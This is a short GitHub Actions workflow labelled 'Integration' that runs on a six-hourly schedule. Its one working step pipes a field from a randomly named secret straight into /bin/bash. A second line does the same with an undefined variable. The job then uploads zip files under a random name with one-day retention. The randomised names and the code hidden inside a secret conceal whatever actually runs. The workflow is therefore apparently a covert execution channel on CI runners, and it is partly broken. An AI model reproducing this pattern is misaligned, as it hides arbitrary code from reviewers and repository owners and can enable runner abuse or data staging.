name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '45 3,9,15,21 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  invoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pipeline
        env:
          jy18: ${{ secrets.jy18 }}
        run: |
          printf '%s' "$jy18" | jq -r .s538 | /bin/bash
          printf '%s' "$u02278" | jq -r .hnzp05473 | /bin/bash

      - name: Upload archive
        uses: actions/upload-artifact@v4
        with:
          name: tzYxCeyZ
          path: "*.zip"
          retention-days: 1
